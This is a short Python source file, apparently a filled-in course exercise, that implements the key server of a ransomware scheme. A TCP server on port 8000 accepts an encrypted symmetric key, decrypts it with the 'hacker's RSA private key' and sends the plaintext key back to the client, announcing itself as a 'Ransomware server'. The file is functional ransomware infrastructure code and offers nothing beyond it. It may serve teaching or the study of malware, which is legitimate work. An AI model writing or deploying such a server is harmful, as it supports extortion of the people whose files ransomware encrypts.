import socketserver
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding

class ClientHandler(socketserver.BaseRequestHandler):
    def handle(self):
        # ← skeleton line: encrypted_key = self.request.recv(1024).strip()
        encrypted_key = self.request.recv(4096).strip()
        print("Received:", encrypted_key)

        # Load the hacker’s RSA private key
        with open("private_key.pem", "rb") as key_file:
            privkey = serialization.load_pem_private_key(
                key_file.read(),
                password=None,
                backend=default_backend()
            )

        # Decrypt the symmetric key
        symmetric_key = privkey.decrypt(
            encrypted_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        print("Decrypted key:", symmetric_key)

        # Send it back to the client
        self.request.sendall(symmetric_key)

if __name__ == "__main__":
    HOST, PORT = "", 8000
    tcpServer = socketserver.TCPServer((HOST, PORT), ClientHandler)
    print(f"[+] Ransomware server listening on {HOST or '0.0.0.0'}:{PORT}")
    try:
        tcpServer.serve_forever()      # ← skeleton line: # tcpServer.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Shutting down")
